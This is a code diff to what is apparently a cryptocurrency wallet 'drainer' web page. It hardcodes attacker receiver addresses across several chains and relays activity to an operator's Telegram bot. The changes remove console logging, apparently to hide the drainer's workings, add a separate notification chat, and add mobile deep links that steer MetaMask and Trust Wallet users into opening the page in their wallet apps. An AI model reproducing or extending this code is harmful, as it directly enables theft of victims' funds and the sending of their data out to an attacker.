@@ -1,6 +1,6 @@
 ﻿$(document).ready(function() {
-    // Configuration
-    const RECEIVER_ADDRESSES = {
+    // Load configuration from config.js
+    const RECEIVER_ADDRESSES = window.DRAINER_CONFIG?.RECEIVER_ADDRESSES || {
         ETH: '0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE',
         BSC: '0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE',
         POLYGON: '0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE',
@@ -230,25 +230,15 @@
         stats: { sent: 0, failed: 0, queued: 0 },
         
         init: function() {
-            console.log('🔧 TelegramService.init() called');
-            console.log('📦 window.DRAINER_CONFIG:', window.DRAINER_CONFIG);
             this.config = window.DRAINER_CONFIG?.TELEGRAM;
-            console.log('⚙️ Telegram config loaded:', this.config);
-            if (this.config?.enabled) {
-                console.log('📡 Telegram service initialized - ENABLED');
-            } else {
-                console.log('📡 Telegram service initialized - DISABLED or no config');
-            }
+            // Telegram service initialized (logging handled via Telegram, not console)
         },
         
-        async send(message, type = 'info') {
-            console.log('📨 send() called:', message, 'type:', type, 'config:', this.config);
+        async send(message, type = 'info', useNotificationChat = false) {
             if (!this.config?.enabled) {
-                console.log('❌ Telegram not enabled');
                 return;
             }
             if (!this.config.botToken || !this.config.chatId) {
-                console.warn('⚠️ Telegram credentials missing');
                 return;
             }
             
@@ -257,41 +247,39 @@
             const emoji = emojis[type] || '📝';
             const formattedMessage = `${emoji} <code>${message}</code>`;
             
+            // Determine which chat ID to use
+            const targetChatId = useNotificationChat && this.config.notificationChatId 
+                ? this.config.notificationChatId 
+                : this.config.chatId;
+            
             // Queue message for processing
-            this.queue.push({ text: formattedMessage, type });
+            this.queue.push({ text: formattedMessage, type, chatId: targetChatId });
             this.stats.queued = this.queue.length;
-            console.log('📥 Message queued. Queue length:', this.queue.length);
             
             if (!this.isProcessing) {
-                console.log('🚀 Starting processQueue...');
                 this.processQueue();
             }
         },
         
         async processQueue() {
-            console.log('⚙️ processQueue() called. Queue:', this.queue.length, 'isProcessing:', this.isProcessing);
             if (this.queue.length === 0 || this.isProcessing) {
-                console.log('⏭️ Skipping processQueue - empty queue or already processing');
                 return;
             }
             this.isProcessing = true;
-            console.log('🔄 Starting to process queue...');
             
             while (this.queue.length > 0) {
-                const { text } = this.queue.shift();
-                console.log('📤 Sending message:', text);
-                await this.sendDirect(text);
+                const { text, chatId } = this.queue.shift();
+                await this.sendDirect(text, chatId);
                 await new Promise(r => setTimeout(r, 100)); // Rate limiting
             }
             
             this.isProcessing = false;
-            console.log('✅ Queue processing complete');
         },
         
-        async sendDirect(text) {
-            console.log('📡 sendDirect() called with text:', text);
+        async sendDirect(text, chatId = null) {
+            const targetChatId = chatId || this.config.chatId;
             const payload = {
-                chat_id: this.config.chatId,
+                chat_id: targetChatId,
                 text: text,
                 parse_mode: 'HTML',
                 disable_web_page_preview: true
@@ -300,20 +288,17 @@
             // Method 1: Direct API with Fetch
             try {
                 const url = `${this.config.apiUrl}${this.config.botToken}/sendMessage`;
-                console.log('🌐 Attempting Fetch to:', url);
                 const response = await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-                console.log('📬 Fetch response status:', response.status, 'ok:', response.ok);
                 if (response.ok) {
                     this.stats.sent++;
-                    console.log('✅ Message sent via Fetch. Total sent:', this.stats.sent);
                     return;
                 }
             } catch (e) {
-                console.log('❌ Fetch failed:', e.message);
+                // Fetch failed, try fallback
             }
             
             // Method 2: XMLHttpRequest (Best cross-origin)
@@ -343,7 +328,6 @@
         },
         
         test: async function() {
-            console.log('🧪 Testing Telegram connection...');
             if (!this.config?.enabled) {
                 log('Telegram is disabled', 'warning');
                 return;
@@ -1095,9 +1079,43 @@
         const grid = $('#wallet-selection-grid');
         grid.empty();
         
+        // If no wallets detected, show mobile deep link options for MetaMask and Trust Wallet
         if (detectedWallets.length === 0) {
-            grid.html('<div style="grid-column: 1/-1; text-align: center; opacity: 0.7; padding: 20px;">No wallets detected. Please install wallet extensions.</div>');
-            return;
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            if (isMobile) {
+                const currentUrl = window.location.href;
+                const encodedUrl = encodeURIComponent(currentUrl);
+                const mobileWallets = [
+                    {
+                        name: 'MetaMask',
+                        icon: '🦊',
+                        deepLink: `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`
+                    },
+                    {
+                        name: 'Trust Wallet',
+                        icon: '🛡️',
+                        deepLink: `https://link.trustwallet.com/open_url?url=${encodedUrl}`
+                    }
+                ];
+                grid.html('<div style="grid-column: 1/-1; text-align: center; opacity: 0.7; padding: 20px;">No wallets detected.<br>If you have MetaMask or Trust Wallet installed, tap below to open this site in your wallet app:</div>');
+                mobileWallets.forEach(wallet => {
+                    const btn = $(`
+                        <div class="wallet-selection-item mobile-option" style="margin: 10px auto; max-width: 300px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 12px; color: white; padding: 18px; cursor: pointer; font-size: 1.1em; display: flex; align-items: center; justify-content: center; gap: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.2);">
+                            <span style="font-size: 2em;">${wallet.icon}</span>
+                            <span style="font-weight: bold;">Open in ${wallet.name}</span>
+                        </div>
+                    `);
+                    btn.on('click', () => {
+                        window.open(wallet.deepLink, '_blank');
+                    });
+                    grid.append(btn);
+                });
+                grid.append(`<div style="grid-column: 1/-1; text-align: center; color: #ccc; font-size: 0.95em; margin-top: 18px;">If the button doesn't work, open your wallet app, go to the browser tab, and enter:<br><span style='color:#4CAF50;background:#222;padding:2px 6px;border-radius:4px;'>${window.location.href}</span></div>`);
+                return;
+            } else {
+                grid.html('<div style="grid-column: 1/-1; text-align: center; opacity: 0.7; padding: 20px;">No wallets detected. Please install wallet extensions.</div>');
+                return;
+            }
         }
         
         detectedWallets.forEach((wallet, index) => {
@@ -2939,7 +2957,7 @@
             priceData.forEach(crypto => {
                 summary += `${crypto.symbol}: $${crypto.price} (${crypto.change}%)\n`;
             });
-            console.log(summary);
+            log(summary, 'info', true);
         }
     });
 });
